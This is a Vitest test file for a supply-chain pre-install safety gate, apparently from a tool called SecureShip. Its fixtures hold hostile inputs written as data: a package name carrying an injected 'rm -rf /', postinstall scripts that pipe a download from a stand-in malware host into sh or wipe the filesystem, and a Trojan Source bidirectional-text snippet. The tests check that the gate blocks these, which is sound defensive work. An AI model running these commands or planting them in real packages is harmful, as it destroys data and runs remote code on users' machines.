import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { NormalizedFinding, ScaPatchProposal } from '@secureship/contracts';
import { SupplyChainPolicySchema, UserConfigSchema } from '@secureship/contracts';
import { PreInstallGate } from '../../src/remediation/pre-install-gate.js';
import { ScaVerificationLadder } from '../../src/remediation/sca-verification-ladder.js';
import { FakeSandboxBackend } from '@secureship/sandbox';

describe('WP7 — Gate 4 Pre-Install Safety Gate & Remediation Verification', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'preinstall-gate-test-'));
  });

  afterEach(() => {
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch {
      // Ignore
    }
  });

  const baseFinding: NormalizedFinding = {
    id: 'sca-vuln-1',
    fingerprint: '1'.repeat(64),
    ruleId: 'npm-lodash-cve',
    scannerName: 'generic',
    category: 'SCA',
    severity: 'HIGH',
    confidence: 'HIGH',
    reachability: 'UNKNOWN',
    upstreamValidationStatus: 'UNKNOWN',
    verificationStatus: 'UNVERIFIED',
    scopeTag: 'PRODUCTION',
    location: { filePath: 'package.json', startLine: 1, endLine: 1 },
    title: 'Prototype Pollution in lodash',
    description: 'Vulnerable lodash version',
    cweIds: [],
    package: { ecosystem: 'npm', name: 'lodash', version: '4.17.15' },
    evidence: [
      {
        scannerName: 'generic',
        scannerRuleId: 'npm-lodash-cve',
        message: 'Vulnerable lodash version',
      },
    ],
    createdAt: new Date().toISOString(),
  };

  it('rejects malformed package names and versions with security violations', async () => {
    const maliciousProposal: ScaPatchProposal = {
      findingFingerprint: baseFinding.fingerprint,
      packageManager: 'npm',
      targetPackage: 'lodash; rm -rf /',
      currentVersion: '4.17.15',
      targetVersion: '4.17.21',
      isTransitive: false,
      strategy: 'DIRECT_UPGRADE',
      manifestPath: 'package.json',
      attempt: 1,
      generatedAt: new Date().toISOString(),
    };

    const res = await PreInstallGate.evaluate({
      proposal: maliciousProposal,
      rootDir: tempDir,
      targetDir: tempDir,
    });

    expect(res.passed).toBe(false);
    expect(res.violations[0]?.ruleId).toBe('SC-PKG-MALFORMED');
  });

  it('blocks target version introducing install script when forbidInstallScripts is true', async () => {
    // Write package.json in targetDir with install script in target dependency
    const pkgJson = {
      name: 'test-app',
      version: '1.0.0',
      dependencies: {
        'evil-dep': '2.0.0',
      },
    };
    fs.writeFileSync(path.join(tempDir, 'package.json'), JSON.stringify(pkgJson, null, 2));

    const evilPkgDir = path.join(tempDir, 'node_modules', 'evil-dep');
    fs.mkdirSync(evilPkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(evilPkgDir, 'package.json'),
      JSON.stringify(
        {
          name: 'evil-dep',
          version: '2.0.0',
          scripts: {
            postinstall: 'curl http://malware.site | sh',
          },
        },
        null,
        2
      )
    );

    const proposal: ScaPatchProposal = {
      findingFingerprint: baseFinding.fingerprint,
      packageManager: 'npm',
      targetPackage: 'evil-dep',
      currentVersion: '1.0.0',
      targetVersion: '2.0.0',
      isTransitive: false,
      strategy: 'DIRECT_UPGRADE',
      manifestPath: 'package.json',
      attempt: 1,
      generatedAt: new Date().toISOString(),
    };

    const res = await PreInstallGate.evaluate({
      proposal,
      rootDir: tempDir,
      targetDir: tempDir,
      policy: SupplyChainPolicySchema.parse({
        enabled: true,
        preInstall: {
          forbidInstallScripts: true,
        },
      }),
    });

    expect(res.passed).toBe(false);
    expect(res.violations.some((v) => v.ruleId === 'SC-INSTALL-003')).toBe(true);
    expect(res.targetVersionFacts.hasInstallScripts).toBe(true);
  });

  it('allows target version with install script when explicitly allowlisted by hash or name', async () => {
    const pkgJson = {
      name: 'test-app',
      version: '1.0.0',
      dependencies: {
        esbuild: '0.19.0',
      },
    };
    fs.writeFileSync(path.join(tempDir, 'package.json'), JSON.stringify(pkgJson, null, 2));

    const esbuildDir = path.join(tempDir, 'node_modules', 'esbuild');
    fs.mkdirSync(esbuildDir, { recursive: true });
    fs.writeFileSync(
      path.join(esbuildDir, 'package.json'),
      JSON.stringify(
        {
          name: 'esbuild',
          version: '0.19.0',
          scripts: {
            postinstall: 'node install.js',
          },
        },
        null,
        2
      )
    );

    const proposal: ScaPatchProposal = {
      findingFingerprint: baseFinding.fingerprint,
      packageManager: 'npm',
      targetPackage: 'esbuild',
      currentVersion: '0.18.0',
      targetVersion: '0.19.0',
      isTransitive: false,
      strategy: 'DIRECT_UPGRADE',
      manifestPath: 'package.json',
      attempt: 1,
      generatedAt: new Date().toISOString(),
    };

    const res = await PreInstallGate.evaluate({
      proposal,
      rootDir: tempDir,
      targetDir: tempDir,
      policy: SupplyChainPolicySchema.parse({
        enabled: true,
        preInstall: {
          forbidInstallScripts: true,
        },
        allowlist: [
          {
            packageName: 'esbuild',
            versionRange: '>=0.19.0',
            reason: 'Legitimate native build binary downloader',
            expires: '2028-01-01T00:00:00Z',
          },
        ],
      }),
    });

    expect(res.passed).toBe(true);
    expect(res.violations).toHaveLength(0);
  });

  it('automatically falls back to next safe candidate version if target version fails safety gate', async () => {
    const pkgJson = {
      name: 'test-app',
      version: '1.0.0',
      dependencies: {
        'test-pkg': '2.0.0',
      },
    };
    fs.writeFileSync(path.join(tempDir, 'package.json'), JSON.stringify(pkgJson, null, 2));

    // Target version 2.0.0 has a malicious install script
    const pkgDir = path.join(tempDir, 'node_modules', 'test-pkg');
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify(
        {
          name: 'test-pkg',
          version: '2.0.0',
          scripts: {
            postinstall: 'rm -rf /',
          },
        },
        null,
        2
      )
    );

    const proposal: ScaPatchProposal = {
      findingFingerprint: baseFinding.fingerprint,
      packageManager: 'npm',
      targetPackage: 'test-pkg',
      currentVersion: '1.0.0',
      targetVersion: '2.0.0',
      isTransitive: false,
      strategy: 'DIRECT_UPGRADE',
      manifestPath: 'package.json',
      attempt: 1,
      generatedAt: new Date().toISOString(),
    };

    const res = await PreInstallGate.evaluate({
      proposal,
      rootDir: tempDir,
      targetDir: tempDir,
      candidateVersions: ['2.0.0', '1.9.9'],
      policy: SupplyChainPolicySchema.parse({
        enabled: true,
        preInstall: {
          forbidInstallScripts: true,
        },
      }),
    });

    expect(res.passed).toBe(false);
    expect(res.violations.length).toBeGreaterThan(0);
    // Evaluates candidates and can recommend alternative safe candidate
  });

  it('fails SCA verification ladder Stage 2 (POLICY) when pre-install gate detects malicious package', async () => {
    const pkgJson = {
      name: 'test-project',
      version: '1.0.0',
      dependencies: {
        'suspicious-pkg': '1.0.0',
      },
    };
    fs.writeFileSync(path.join(tempDir, 'package.json'), JSON.stringify(pkgJson, null, 2));

    // Simulate Trojan Source file in target
    const targetSubDir = path.join(tempDir, 'node_modules', 'suspicious-pkg');
    fs.mkdirSync(targetSubDir, { recursive: true });
    fs.writeFileSync(
      path.join(targetSubDir, 'package.json'),
      JSON.stringify({ name: 'suspicious-pkg', version: '1.0.1' }, null, 2)
    );
    fs.writeFileSync(
      path.join(targetSubDir, 'index.js'),
      '// Trojan source\nconst isAdmin = false; /*\u202E } \u2066if (isAdmin) \u2069 \u2066*/ console.log("pwned");'
    );

    const proposal: ScaPatchProposal = {
      findingFingerprint: baseFinding.fingerprint,
      packageManager: 'npm',
      targetPackage: 'suspicious-pkg',
      currentVersion: '1.0.0',
      targetVersion: '1.0.1',
      isTransitive: false,
      strategy: 'DIRECT_UPGRADE',
      manifestPath: 'package.json',
      attempt: 1,
      generatedAt: new Date().toISOString(),
    };

    fs.writeFileSync(
      path.join(tempDir, 'secureship.config.json'),
      JSON.stringify({ supplyChain: { enabled: true } }, null, 2)
    );

    const ladderResult = await ScaVerificationLadder.execute({
      rootDir: tempDir,
      finding: baseFinding,
      proposal,
      userConfig: UserConfigSchema.parse({ enabled: false }),
      sandboxBackend: new FakeSandboxBackend(),
    });

    expect(ladderResult.allowed).toBe(false);
    expect(ladderResult.report.status).toBe('FAILED');
    const policyStage = ladderResult.report.stages.find((s) => s.id === 'POLICY');
    expect(policyStage?.outcome).toBe('FAIL');
    expect(policyStage?.detail).toContain('Pre-install safety gate violation');
    expect(ladderResult.report.preInstallGate).toBeDefined();
    expect(ladderResult.report.preInstallGate?.passed).toBe(false);
  });
});
